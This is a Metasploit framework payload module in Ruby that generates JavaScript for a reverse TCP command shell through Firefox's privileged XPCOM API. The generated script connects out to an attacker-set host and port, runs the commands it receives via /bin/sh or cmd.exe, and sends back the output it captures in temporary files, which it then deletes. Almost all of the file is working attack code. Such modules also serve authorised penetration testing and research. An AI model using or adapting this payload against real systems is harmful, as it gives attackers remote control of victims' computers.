##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# It would be better to have a commonjs payload, but because the implementations
# differ so greatly when it comes to require() paths for net modules, we will
# settle for just getting shells on nodejs.

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Command Shell, Reverse TCP (via Firefox XPCOM script)',
      'Description'   => 'Creates an interactive shell via Javascript with access to Firefox\'s XPCOM API',
      'Author'        => ['joev'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'firefox',
      'Arch'          => ARCH_FIREFOX,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'firefox',
      'Payload'       => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the JS string to use for execution
  #
  def command_string
    %Q|
    (function(){
      Components.utils.import("resource://gre/modules/NetUtil.jsm");

      var ua = Components.classes["@mozilla.org/network/protocol;1?name=http"]
        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;

      var host = '#{datastore["LHOST"]}';
      var port = #{datastore["LPORT"]};

      var socketTransport = Components.classes["@mozilla.org/network/socket-transport-service;1"]
                              .getService(Components.interfaces.nsISocketTransportService);
      var socket = socketTransport.createTransport(null, 0, host, port, null);
      var outStream = socket.openOutputStream(0, 0, 0);
      var inStream = socket.openInputStream(0, 0, 0);

      var pump = Components.classes["@mozilla.org/network/input-stream-pump;1"]
                     .createInstance(Components.interfaces.nsIInputStreamPump);
      pump.init(inStream, -1, -1, 0, 0, true);

      var listener = {
        onStartRequest: function(request, context) {},
        onStopRequest: function(request, context) {},
        onDataAvailable: function(request, context, stream, offset, count)
        {
          var data = NetUtil.readInputStreamToString(stream, count).trim();
          var output = runCmd(data);
          outStream.write(output[0], output[0].length);
          outStream.flush();
        }
      };

      var runCmd = function(cmd) {
        var shPath = "/bin/sh";
        var shFlag = "-c";
        var shEsc = "\\\\$&";

        if (ua.indexOf("Windows")>-1) {
          shPath = "C:\\\\Windows\\\\system32\\\\cmd.exe";
          shFlag = "/c";
          shEsc = "\\^$&";
        }

        var stdoutFile = "#{Rex::Text.rand_text_alphanumeric(8)}";
        var stderrFile = "#{Rex::Text.rand_text_alphanumeric(8)}";

        var stdout = Components.classes["@mozilla.org/file/directory_service;1"]
          .getService(Components.interfaces.nsIProperties)
          .get("TmpD", Components.interfaces.nsIFile);
        stdout.append(stdoutFile);

        var stderr = Components.classes["@mozilla.org/file/directory_service;1"]
          .getService(Components.interfaces.nsIProperties)
          .get("TmpD", Components.interfaces.nsIFile);
        stderr.append(stderrFile);

        var sh = Components.classes["@mozilla.org/file/local;1"]
                   .createInstance(Components.interfaces.nsILocalFile);
        sh.initWithPath(shPath);

        var shell = shPath + " " + shFlag + " " + (cmd + " >"+stdout.path+" 2>"+stderr.path).replace(/\\W/g, shEsc);
        var process = Components.classes["@mozilla.org/process/util;1"]
          .createInstance(Components.interfaces.nsIProcess);
        process.init(sh);
        process.run(true, [shFlag, shell], 2);
        return [readFile(stdout.path), readFile(stderr.path)];
      };

      var readFile = function(path) {
        try {
          var file = Components.classes["@mozilla.org/file/local;1"]
                   .createInstance(Components.interfaces.nsILocalFile);
          file.initWithPath(path);

          var fileStream = Components.classes["@mozilla.org/network/file-input-stream;1"]
                           .createInstance(Components.interfaces.nsIFileInputStream);
          fileStream.init(file, 1, 0, false);

          var binaryStream = Components.classes["@mozilla.org/binaryinputstream;1"]
                             .createInstance(Components.interfaces.nsIBinaryInputStream);
          binaryStream.setInputStream(fileStream);
          var array = binaryStream.readByteArray(fileStream.available());

          binaryStream.close();
          fileStream.close();
          file.remove(true);

          return array.map(function(aItem) { return String.fromCharCode(aItem); }).join("").trim();
        } catch (e) { return ""; }
      };

      pump.asyncRead(listener, null);
    })();
    |
  end
end
